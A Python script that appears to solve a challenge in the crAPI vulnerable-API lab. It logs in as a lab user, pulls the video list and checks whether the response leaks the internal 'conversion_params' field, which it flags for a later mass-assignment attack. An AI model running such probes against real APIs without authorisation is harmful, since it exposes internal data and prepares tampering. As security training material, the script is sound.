#!/usr/bin/env python3
"""Challenge 5: Find internal video property (conversion_params)"""
import argparse, sys
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_user_videos(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/videos",
                        headers=headers, timeout=timeout).json()
        return r.get("videos") or r.get("data") or []
    except:
        return []

def main():
    parser = argparse.ArgumentParser(description="Challenge 5: Internal Video Property")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--user-email", default="mike1@my.lab")
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 5: Internal Video Property\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    videos = get_user_videos(base_url, token)
    if not videos:
        print("[!] No videos found"); sys.exit(1)

    print(f"\n[*] Analyzing video response for internal properties...")
    for i, video in enumerate(videos[:3]):
        print(f"\n[Video {i+1}]")
        print(f"  ID: {video.get('id')}")
        print(f"  Name: {video.get('video_name')}")
        if "conversion_params" in video:
            print(f"  [LEAKED] conversion_params: {video.get('conversion_params')}")
            print(f"\n[!] VULNERABLE: Internal property 'conversion_params' exposed")
            print(f"[!] Can be exploited in Challenge 10 (Mass Assignment)")
            return

    print("\n[!] conversion_params not found in current videos")

if __name__ == "__main__":
    main()
